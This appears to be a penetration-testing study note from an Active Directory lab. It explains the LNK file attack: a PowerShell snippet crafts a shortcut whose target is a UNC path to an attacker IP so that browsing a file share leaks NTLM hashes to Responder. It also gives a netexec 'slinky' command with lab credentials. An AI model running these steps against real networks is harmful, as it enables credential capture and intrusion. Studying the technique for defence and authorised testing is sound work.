---
title: "LNK File Attack"
_build:
  list: never
---

*(also called URL File Attack)*  


Watering hole of sorts  
Placing a malicious file in a shared folder so that someone accesses it 

Many ways  

## Process (Manual)
Step 1:  
If I have access to a fileshare and want to dump a mal file, use this powershell commands:
```
$objShell = New-Object -ComObject WScript.shell

$lnk = $objShell.CreateShortcut("C:\@test.lnk")     //make a lnk file
// in a file share the '@' or a '~' will make sure that this file is at the top so that it is loaded correctly

$lnk.TargetPath = "\\192.168.138.149\@test.png"    //this file will try to resolve a png image which actually points back to the **attacker machine(IP)**

$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```
This generates a file and that gets placed in a file share and if responder is up and that mal file is triggered, I can capture a hash  
**So basically trying to generate event for responder**

Step 2:   
Put this in the fileshare  

Step 3:  
Event happens (victim opens the fileshare that has the .lnk file)    
![Pasted image 20251222191020](images/Pasted-image-20251222191020.png)  

Step 4:  
Explorer tries to resolve the target path in the .lnk metadata  
So when explorer sees: `\\192.168.138.149\@test.png`   
-> Windows initiates an SMB connection  


---
#### Note 1:   
This can be done from any device with windows and not necesarrily from the victim's machine  

#### Note 2:  
Why `@`, `~`, etc.?  
Because **Windows Explorer sorts files lexicographically**, and symbols come before letters.  
This increases the chance that Explorer processes your `.lnk` **first** when enumerating the directory.  

#### Note 3:  
How does just _viewing_ the file share trigger authentication and leak hashes?  
Because **Windows Explorer automatically resolves metadata for `.lnk` files**, including:  
- Icon location  
- Target path  
And **resolving a UNC path (`\\attacker\...`) triggers SMB authentication automatically**.  
No click required.  

---


## Automatic Process (via netexec or CME)

```
netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149
```

Current AD configurations does not have the fileshare (hackme) exposed so this will not work in this case, but if a similar fileshare is found through modules in an actual pentest -> this should work
